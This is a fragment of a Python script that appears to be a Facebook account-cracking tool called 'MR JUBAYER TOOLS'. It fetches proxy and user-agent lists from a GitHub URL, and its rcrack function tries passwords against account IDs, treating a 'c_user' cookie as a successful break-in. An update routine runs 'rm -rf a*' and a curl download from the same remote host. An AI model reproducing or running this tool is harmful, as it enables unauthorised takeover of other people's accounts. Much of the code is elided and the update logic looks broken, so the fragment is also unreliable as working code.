...
ugen=[]
try:
    prox= requests.get('https://github.com/JUBAYER-420/MARUF.JUBAYER.git').text
...
android_models=[]
try:
    xx = requests.get('https://github.com/JUBAYER-420/MARUF.JUBAYER.git').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass
usr=[]
try:
    xd=requests.get('https://github.com/JUBAYER-420/MARUF.JUBAYER.git').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
...
def clear():
	clr('clear')
	print(logo)
	print('\033[1;37m\033[1;32m[💕] WELCOME TO MR JUBAYER TOOLS [💖]\033[1;0m\33[1;32m')
	linex()
...
try:
    ...
    proxy = requests.get('https://github.com/JUBAYER-420/MARUF.JUBAYER.git').text.splitlines()
    v = 3.1
    update = requests.get('https://github.com/JUBAYER-420/MARUF.JUBAYER.git').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://github.com/JUBAYER-420/MARUF.JUBAYER.git')
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;96m[JUBAYER]\033[1;97m] %s|\33[1;34m[SUCCESS]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
